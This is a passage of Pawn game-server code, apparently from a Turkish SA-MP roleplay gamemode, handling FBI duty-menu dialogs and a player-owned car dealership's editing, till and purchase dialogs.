					GivePlayerValidWeapon(playerid, 43, 99999);
				}
				case 8: // FBI Weapons
				{
					if(GetPlayerCash(playerid) < 800) return SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");
					GivePlayerCash(playerid, -800);
					GivePlayerValidWeapon(playerid, 34, 99999);
				}
				case 9: // FBI Weapons
				{
					SetPlayerArmourEx(playerid, 100);
				}
				case 10: SetPlayerHealth(playerid, 100);
				case 11: // FBI Weapons
				{
					if(PlayerInfo[playerid][pRank] >= 2) {
						if(PlayerInfo[playerid][pRccam] == 0) {
							if(GetPlayerCash(playerid) < 200) return SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");
							GivePlayerCash(playerid, -200);
							PlayerInfo[playerid][pRccam]++;
							SendClientMessage(playerid, COLOR_LIGHTBLUE, "$200 odeyerek yerleþtirilebilir kamera aldýn. /kamerayerlestir komutu ile aktif edebilirsin.");
						} else return SendClientMessage(playerid, COLOR_GRAD2, "Zaten bir yerleþtirilebilir kameraya sahipsin.");
					} else return SendClientMessage(playerid, COLOR_GRAD2, "Yeterli rütbede deðilsin!");
				}
				case 12: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Aksesuarlar", "Devlet memurlarýnýn aksesuar dolabýna hoþgeldiniz.","Devam", "Iptal");
			}
		}
	}
	if(dialogid == FDUTYMENU3)
	{
 		if(response)
		{
			if(listitem == 0) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 286);
				PlayerInfo[playerid][pSkin] = 286;
			}
			if(listitem == 1) //FBI Uniforms
			{
				SetPlayerSkin(playerid, 166);
				PlayerInfo[playerid][pSkin] = 166;
			}
			if(listitem == 2) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 165);
				PlayerInfo[playerid][pSkin] = 165;
			}
			if(listitem == 3) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 294);
				PlayerInfo[playerid][pSkin] = 294;
			}
			if(listitem == 4) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 120);
				PlayerInfo[playerid][pSkin] = 120;
			}
			if(listitem == 5) //FBI Uniforms
			{
				SetPlayerSkin(playerid, 285);
				PlayerInfo[playerid][pSkin] = 285;
			}
			if(listitem == 6) //FBI Uniforms
			{
				SetPlayerSkin(playerid, 141);
				PlayerInfo[playerid][pSkin] = 141;
			}
		}
	}
	if(dialogid == FDUTYMENU4)
	{
 		if(response)
		{
            new skin = strval(inputtext);
			if(IsInvalidSkin(skin) || 274 <= skin <= 288 || skin == 165 || skin == 166 || skin == 71) {
				return ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Gizli","Yanlýþ Skin ID. Baþka girin.", "Seç", "Iptal");
			}
			PlayerInfo[playerid][pSkin] = skin;
			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
		}
	}
    if(dialogid == FDUTYMENU5)
	{
	    if(response)
    	{
            new giveplayerid;
            new giveplayer[MAX_PLAYER_NAME];
			giveplayerid = ReturnUser(inputtext);
			//giveplayerid = strval(inputtext);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "* %s adlý kiþinin tüm kayýtlarýný ve aranma seviyelerini sildin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Ajan %s, senin tüm kayýtlarýný ve aranma seviyelerini sildi.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Ajan %s, %s üzerindeki tüm kayýtlarý ve aranma seviyelerini sildi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendRadioMessage(1, RADIO, string);
					SendRadioMessage(2, RADIO, string);
					PlayerInfo[giveplayerid][pWantedLevel] = 0;
					SetPlayerToTeamColor(giveplayerid);
				    SetPlayerWantedLevel(giveplayerid, 0);
				    ClearCrime(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
				}
			}
		}
	}
	else if(dialogid == DIALOG_CDEDIT)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
            if(listitem == 0) // New Vehicle
			{
				format(string, sizeof(string),"Lütfen yeni aracýn model ID'sini girin.");
		        ShowPlayerDialogEx(playerid,DIALOG_CDNEWVEH,DIALOG_STYLE_INPUT,"Uyarý:",string,"Tamam","Iptal");
			}
			else if(listitem == 1) // My Vehicles
			{
				new vehicles;
                for(new i=0; i<MAX_DEALERSHIPVEHICLES; i++)
	            {
					if(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleModel][i] != 0)
					{
						vehicles++;
		                format(string, sizeof(string), "Araç %d | Ýsim: %s | Fiyat: %d.",i+1,GetVehicleName(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleId][i]),CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleCost][i]);
		                SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
				if(vehicles)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_CDEDITCARS, DIALOG_STYLE_INPUT, "Arac Bayisi:", "Ayarlamak istediðiniz aracý seçin:", "Ayarla", "Geri");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu araç bayisinde hiç araç yok.");
				}
			}
			else if(listitem == 2) // Upgrade
			{
				new listitems[] = "1 Arac Spawn Yeri\n2 Cevre\n3 Bayi Adi\n4 Ucret";
			    ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
			}
			else if(listitem == 3) // Till
			{
				new listitems[] = "1 Para Çek\n2 Para Yatir";
			    ShowPlayerDialogEx(playerid,DIALOG_CDTILL,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
			}
		}
		else
		{
			SavecDealerships();
            SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDTILL)
	{ // car dealership dialog
	    if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
            if(listitem == 0) // Withdraw
			{
				format(string, sizeof(string), "Banka hesabýnda $%d var.\n\n\tNe kadarýný çekmek istiyorsun?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				ShowPlayerDialogEx(playerid,DIALOG_CDWITHDRAW,DIALOG_STYLE_INPUT,"Withdraw", string,"Seç","Iptal");
			}
			else if(listitem == 1) // Deposit
			{
				format(string, sizeof(string), "Banka hesabýnda $%d var.\n\n\tNe kadarýný yatýrmak istiyorsun?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				ShowPlayerDialogEx(playerid,DIALOG_CDDEPOSIT,DIALOG_STYLE_INPUT,"Deposit", string,"Seç","Iptal");
			}
		}
		else
		{
            SavecDealerships();
            SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDWITHDRAW)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
		    if(IsNumeric(inputtext))
	        {
				new money = strval(inputtext);
				if(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill] < money)
				{
					format(string, sizeof(string), "Kasanda o kadar para yok!\n\nKasanda $%d var.\n\n\tNe kadar çekmek istiyorsun?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
					ShowPlayerDialogEx(playerid,DIALOG_CDWITHDRAW,DIALOG_STYLE_INPUT,"Withdraw", string,"Seç","Iptal");
					return 1;
				}
				CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill] -= money;
				PlayerInfo[playerid][pCash] += money;
				format(string, sizeof(string), "Kasandan $%d çektin, yeni durum: $%d", money, CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				SendClientMessage(playerid, COLOR_GRAD2, string);
				SavecDealerships();
				SetPVarInt(playerid, "editingcd", -1);
			}
        }
		else
		{
             SavecDealerships();
             SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDDEPOSIT)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
		    if(IsNumeric(inputtext))
	        {
	             new money = strval(inputtext);
	             if(PlayerInfo[playerid][pCash] < money)
	             {
                     format(string, sizeof(string), "Cüzdanýnda o kadar para yok!\n\nBanka hesabýnda $%d var.\n\n\tNe kadarýný yatýrmak istiyorsun?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				     ShowPlayerDialogEx(playerid,DIALOG_CDDEPOSIT,DIALOG_STYLE_INPUT,"Deposit", string,"Seç","Iptal");
                     return 1;
	             }
	             CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill] += money;
	             PlayerInfo[playerid][pCash] -= money;
	             format(string, sizeof(string), "$%d'ý kasana koydun. yeni durum: $%d", money, CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
	             SendClientMessage(playerid, COLOR_GRAD2, string);
	             SavecDealerships();
                 SetPVarInt(playerid, "editingcd", -1);
			}
		}
		else
		{
             SavecDealerships();
             SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDUPGRADE)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
            if(listitem == 0) // Vehicle Spawn
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Lütfen satýn alýnan araçlarýn nerde spawn olmasýný istiyorsan orda durun.");
				SendClientMessage(playerid, COLOR_GRAD2, "Hazýr olduðunda mousenden ateþ tuþuna bas.");
				SetPVarInt(playerid, "editingcdvehpos", 2);
			}
            if(listitem == 1) // Radius
			{
				ShowPlayerDialogEx(playerid, DIALOG_CDRADIUS, DIALOG_STYLE_INPUT, "Arac Bayisi:", "Yeni çevre belirleyin:", "Ayarla", "Geri");
			}
			else if(listitem == 2) // Dealership Name
			{
				ShowPlayerDialogEx(playerid, DIALOG_CDNAME, DIALOG_STYLE_INPUT, "Arac Bayisi:", "Yeni isim seçin:", "Ayarla", "Geri");
			}
			else if(listitem == 3) // Price
			{
				ShowPlayerDialogEx(playerid, DIALOG_CDPRICE, DIALOG_STYLE_INPUT, "Arac Bayisi:", "Yeni fiyat belirleyin:", "Ayarla", "Geri");
			}
		}
		else
		{
            SavecDealerships();
            SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDRADIUS)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new d;
			d = GetPVarInt(playerid, "editingcd");
			new Float:radius = floatstr(inputtext);
			new Float:radiusex = CarDealershipInfo[d][cdRadius];
			new test = floatround(radius), test1 = floatround(radiusex);
            if(CarDealershipInfo[d][cdRadius] > radius)
	        {
				 new cost = (test - test1) * (test1 * 1000);
				 if(PlayerInfo[playerid][pCash] < cost)
				 {
                     format(string, sizeof(string), "Hata: Bunu yapmak için yeterli paran yok ($%d).",cost);
                     SendClientMessage(playerid, COLOR_GREY, string);
                     return 1;
				 }
				 format(string, sizeof(string), "Araç bayisinin çevresi $%d ödenerek %.1f'ten %.1f'e arttýrýldý.",radiusex, radius, cost);
                 SendClientMessage(playerid, COLOR_GREY, string);
	             CarDealershipInfo[d][cdRadius] = radius;
	             format(string,128,"%s arac bayisi\nSahibi: %s\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdOwner], d);
	             UpdateDynamic3DTextLabelText(CarDealershipInfo[d][cdTextLabel], COLOR_LIGHTBLUE, string);
	             new listitems[] = "1 Arac Spawn Yeri\n2 Cevre\n3 Bayi Adi\n4 Ucret";
			     ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
			     SavecDealerships();
	        }
		}
		else
		{
		    new listitems[] = "1 Arac Spawn Yeri\n2 Cevre\n3 Bayi Adi\n4 Ucret";
			ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
		}
	}
	else if(dialogid == DIALOG_CDNAME)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new d;
			d = GetPVarInt(playerid, "editingcd");
            if(!strlen(inputtext))
			{
			    SendClientMessage(playerid, COLOR_LIGHTRED, "** Ýsim yazmak zorundasýnýz **");
    	        ShowPlayerDialogEx(playerid, DIALOG_CDNAME, DIALOG_STYLE_INPUT, "Arac Bayisi:", "Yeni isim seçin:", "Ayarla", "Geri");
		        return 1;
			}
			new cost = strlen(inputtext) * 50;
			format(string, sizeof(string), "Araç bayisinin ismi $%d'a %s'den %s olarak deðiþtirildi.", CarDealershipInfo[d][cdMessage], inputtext, cost);
            SendClientMessage(playerid, COLOR_GREY, string);
	        strmid(CarDealershipInfo[d][cdMessage], inputtext, 0, strlen(inputtext), 255);
	        format(string,128,"%s arac bayisi\nSahibi: %s\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdOwner], d);
	        UpdateDynamic3DTextLabelText(CarDealershipInfo[d][cdTextLabel], COLOR_LIGHTBLUE, string);
	        new listitems[] = "1 Arac Spawn Yeri\n2 Cevre\n3 Bayi Adi\n4 Ucret";
			ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
			SavecDealerships();
		}
		else
		{
		    new listitems[] = "1 Arac Spawn Yeri\n2 Cevre\n3 Bayi Adi\n4 Ucret";
			ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
		}
	}
	else if(dialogid == DIALOG_CDEDITCARS)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new cdvid;
            if(IsNumeric(inputtext))
	        {
	             cdvid = strval(inputtext);
	             if(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleModel][cdvid-1])
	             {
	                 SetPVarInt(playerid, "editingcdveh", cdvid-1);
	                 new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			         ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
				 }
	        }
		}
		else
		{
		    new listitems[] = "1 Yeni Arac\n2 Araclarim\n3 Gelistir\n4 Kasa";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDIT,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
		}
	}
	else if(dialogid == DIALOG_CDEDITONE)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
            if(listitem == 0) // Edit Model
			{
	             ShowPlayerDialogEx(playerid, DIALOG_CDEDITMODEL, DIALOG_STYLE_INPUT, "Arac Bayisi:", "Yeni model ID belirleyin:", "Ayarla", "Geri");
	        }
	        else if(listitem == 1) // Edit Cost
			{
	             ShowPlayerDialogEx(playerid, DIALOG_CDEDITCOST, DIALOG_STYLE_INPUT, "Arac Bayisi:", "Araç için yeni fiyat belirleyin.", "Ayarla", "Geri");
	        }
	        else if(listitem == 2) // Edit Park
			{
				 PutPlayerInVehicle(playerid, CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleId][GetPVarInt(playerid, "editingcdveh")], 0);
	             SendClientMessage(playerid, COLOR_GRAD2, "Lütfen aracý park etmek istediðiniz yerde durun.");
				 SendClientMessage(playerid, COLOR_GRAD2, "Hazýr olduðunda mousenden ateþ tuþuna bas.");
				 SetPVarInt(playerid, "editingcdvehpos", 1);
	        }
	        else if(listitem == 3) // Delete Vehicle
			{
	             format(string, sizeof(string), "%s model araci silmek istediðinize emin misiniz?\nUyarý: Geri ödeme almayacaksýnýz.",
				 GetVehicleName(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleId][GetPVarInt(playerid, "editingcdveh")]));
		         ShowPlayerDialogEx(playerid,DIALOG_CDDELVEH,DIALOG_STYLE_MSGBOX,"Uyarý:",string,"Tamam","Iptal");
	        }
		}
		else
		{
            SavecDealerships();
            SetPVarInt(playerid, "editingcdveh", -1);
		}
	}
    else if(dialogid == DIALOG_CDEDITMODEL)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
			new modelid, d, v;
			new text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			v = GetPVarInt(playerid, "editingcdveh");
            if(IsNumeric(inputtext))
	        {
	             modelid = strval(inputtext);
	             if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "Araç numarasý 400'ün altýnda yada 611'in üzerinde olamaz!"); return 1; }
	             CarDealershipInfo[d][cdVehicleModel][v] = modelid;
	             DestroyDynamic3DTextLabel(CarDealershipInfo[d][cdVehicleLabel][v]);
	             DestroyVehicle(CarDealershipInfo[d][cdVehicleId][v]);
	             VehicleRadioStation[CarDealershipInfo[d][cdVehicleId][v]] = 0;
	             new carcreated;
	             carcreated = CreateVehicle(CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawnX][v], CarDealershipInfo[d][cdVehicleSpawnY][v], CarDealershipInfo[d][cdVehicleSpawnZ][v], CarDealershipInfo[d][cdVehicleSpawnAngle][v], 0, 0, 6);
		         format(text_info, sizeof(text_info),"%s Satilik | Ucret: %d", GetVehicleName(carcreated), CarDealershipInfo[d][cdVehicleCost][v]);
                 CarDealershipInfo[d][cdVehicleLabel][v] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,8.0,INVALID_PLAYER_ID,carcreated);
	             CarDealershipInfo[d][cdVehicleId][v] = carcreated;
	             new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			     ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
			     SavecDealerships();
	        }
		}
		else
		{
		    new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
		}
	}
	else if(dialogid == DIALOG_CDEDITCOST)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
			new price, d, v;
			new text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			v = GetPVarInt(playerid, "editingcdveh");
            if(IsNumeric(inputtext))
	        {
	             price = strval(inputtext);
	             CarDealershipInfo[d][cdVehicleCost][v] = price;
	             format(text_info, sizeof(text_info), "%s Satilik | Ucret: %d", GetVehicleName(CarDealershipInfo[d][cdVehicleId][v]), CarDealershipInfo[d][cdVehicleCost][v]);
	             UpdateDynamic3DTextLabelText(CarDealershipInfo[d][cdVehicleLabel][v], COLOR_LIGHTBLUE, text_info);
	             new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			     ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
			     SavecDealerships();
	        }
		}
		else
		{
		    new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
		}
	}
	else if(dialogid == DIALOG_CDDELVEH)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
			DestroyCarDealershipVehicle(GetPVarInt(playerid, "editingcd"), GetPVarInt(playerid, "editingcdveh"));
			SavecDealerships();
		}
		else
		{
		    new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
		}
	}
	else if(dialogid == DIALOG_CDEDITPARK)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1 &&  GetPVarInt(playerid, "editingcdvehpos") == 1 || GetPVarInt(playerid, "editingcdvehnew"))
		{
			new Float: x, Float: y, Float: z, Float: a;
			new d, v, text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			v = GetPVarInt(playerid, "editingcdveh");
			GetVehiclePos(CarDealershipInfo[d][cdVehicleId][v], x, y, z);
	        GetVehicleZAngle(CarDealershipInfo[d][cdVehicleId][v], a);
			if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		    {
			     CarDealershipInfo[d][cdVehicleSpawnX][v] = x;
                 CarDealershipInfo[d][cdVehicleSpawnY][v] = y;
                 CarDealershipInfo[d][cdVehicleSpawnZ][v] = z;
                 CarDealershipInfo[d][cdVehicleSpawnAngle][v] = a;
                 SetPVarInt(playerid, "editingcdvehpos", 0);
                 SetPVarInt(playerid, "editingcdvehnew", 0);
                 DestroyDynamic3DTextLabel(CarDealershipInfo[d][cdVehicleLabel][v]);
	             DestroyVehicle(CarDealershipInfo[d][cdVehicleId][v]);
	             VehicleRadioStation[CarDealershipInfo[d][cdVehicleId][v]] = 0;
	             new carcreated;
	             carcreated = CreateVehicle(CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawnX][v], CarDealershipInfo[d][cdVehicleSpawnY][v], CarDealershipInfo[d][cdVehicleSpawnZ][v], CarDealershipInfo[d][cdVehicleSpawnAngle][v], 0, 0, 6);
		         format(text_info, sizeof(text_info), "%s Satilik | Ucret: %d", GetVehicleName(carcreated), CarDealershipInfo[d][cdVehicleCost][v]);
                 CarDealershipInfo[d][cdVehicleLabel][v] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,8.0,INVALID_PLAYER_ID,carcreated);
	             CarDealershipInfo[d][cdVehicleId][v] = carcreated;
	             TogglePlayerControllable(playerid, true);
	             new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			     ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
			     SavecDealerships();
			}
			else
			{
                 SendClientMessage(playerid, COLOR_GREY, "Araç bayisinin yeterince yakýnýnda deðilsin.");
                 TogglePlayerControllable(playerid, true);
			}
		}
		else if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdvehpos") == 2)
		{
			new Float: x, Float: y, Float: z, Float: a;
			new d;
			GetPlayerPos(playerid,x,y,z);
	        GetPlayerFacingAngle(playerid, a);
			d = GetPVarInt(playerid, "editingcd");
			if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		    {
			     CarDealershipInfo[d][cdVehicleSpawn][0] = x;
                 CarDealershipInfo[d][cdVehicleSpawn][1] = y;
                 CarDealershipInfo[d][cdVehicleSpawn][2] = z;
                 CarDealershipInfo[d][cdVehicleSpawn][3] = a;
                 SetPVarInt(playerid, "editingcdvehpos", 0);
	             TogglePlayerControllable(playerid, true);
	             new listitems[] = "1 Arac Spawn Yeri\n2 Cevre\n3 Bayi Adi\n4 Ucret";
			     ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
			     SavecDealerships();
			}
			else
			{
                 SendClientMessage(playerid, COLOR_GREY, "Araç bayisinin yeterince yakýnýnda deðilsin.");
                 TogglePlayerControllable(playerid, true);
			}
		}
		else if(!response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdvehpos") == 1)
		{
            new listitems[] = "1 Modeli Ayarla\n2 Ucreti Ayarla\n3 Park Yeri\n4 Araci Sil";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Arac Bayisi:", listitems,"Seç","Iptal");
			TogglePlayerControllable(playerid, true);
			SetPVarInt(playerid, "editingcdvehpos", 0);
		}
		else if(!response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdvehpos") == 2)
		{
            new listitems[] = "1 Arac Spawn Yeri\n2 Cevre\n3 Bayi Adi\n4 Ucret";
		    ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Devam etmek için birþey seçin.", listitems,"Seç","Iptal");
			TogglePlayerControllable(playerid, true);
			SetPVarInt(playerid, "editingcdvehpos", 0);
		}
	}
	else if(dialogid == DIALOG_CDNEWVEH)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new modelid, d;
			new Float: x, Float: y, Float: z, Float: a;
			new text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			GetPlayerPos(playerid,x,y,z);
	        GetPlayerFacingAngle(playerid, a);
	        if(!IsNumeric(inputtext)) return SendClientMessage(playerid, COLOR_GRAD1, "Hata: Model ID'si numara olmak zorundadýr.");
            if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
	        {
	             modelid = strval(inputtext);
	             if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "Araç numarasý 400'ün altýnda yada 611'in üzerinde olamaz!"); return 1; }
	             new cdvehicleid = CreateCarDealershipVehicle(d, modelid, x, y, z, a, 1337);
	             if(cdvehicleid == -1)
		         {
		             SendClientMessage(playerid, COLOR_GREY, "Hata: Car couldn't be created.");
		         }
	             else
	             {
					 PutPlayerInVehicle(playerid, CarDealershipInfo[d][cdVehicleId][cdvehicleid], 0);
                     format(text_info, sizeof(text_info), "Araç bayisine yeni araç eklendi. Araç ID: %d", cdvehicleid-1);
		             SendClientMessage(playerid, COLOR_GRAD1, text_info);
		             SendClientMessage(playerid, COLOR_GRAD2, "Lütfen yeni aracýnýzý ekleyeceðiniz yerde durun.");
				     SendClientMessage(playerid, COLOR_GRAD2, "Hazýr olduðunda mousenden ateþ tuþuna bas.");
				     SetPVarInt(playerid, "editingcdvehnew", 1);
		             SetPVarInt(playerid, "editingcdveh", cdvehicleid);
	             }
	        }
	        else
	        {
                 SendClientMessage(playerid, COLOR_GREY, "Araç bayisinin yeterince yakýnýnda deðilsin.");
                 TogglePlayerControllable(playerid, true);
	        }
		}
		else
		{
            TogglePlayerControllable(playerid, true);
			SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDBUY)
	{

	    // Account Eating Bug Fix
	    if(!IsPlayerInAnyVehicle(playerid))
		{
		    TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid,COLOR_GRAD2,"Satýn alacaðýn aracýn içerisinde olmalýsýn.");
			return 1;
		}

		new vehicleid = GetPlayerVehicleID(playerid);
		new v = GetCarDealershipVehicleId(vehicleid);
		new d = GetCarDealershipId(vehicleid);
		if(response)
		{
            if(CarDealershipInfo[d][cdVehicleSpawn][0] == 0.0 && CarDealershipInfo[d][cdVehicleSpawn][1] == 0.0 && CarDealershipInfo[d][cdVehicleSpawn][2] == 0.0)
            {
				SendClientMessage(playerid, COLOR_GRAD1, "Hata: Bu araç bayisinin satýcýsý satýn alýnan araçlarýn çýkacaðý yerleri belirlememiþ.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }
            if(CarDealershipInfo[d][cdDonator] == 1 && PlayerInfo[playerid][pDonator] < 1)
            {
 				SendClientMessage(playerid, COLOR_GREY, "Bu bayideki araçlar yalnýzca Yakut VIP'e sahip olanlar içindir.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }
            if(CarDealershipInfo[d][cdDonator] == 2 && PlayerInfo[playerid][pDonator] < 2)
            {
 				SendClientMessage(playerid, COLOR_GREY, "Bu bayideki araçlar yalnýzca Safir VIP'e sahip olanlar içindir.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }
            if(CarDealershipInfo[d][cdDonator] == 3 && PlayerInfo[playerid][pDonator] < 3)
            {
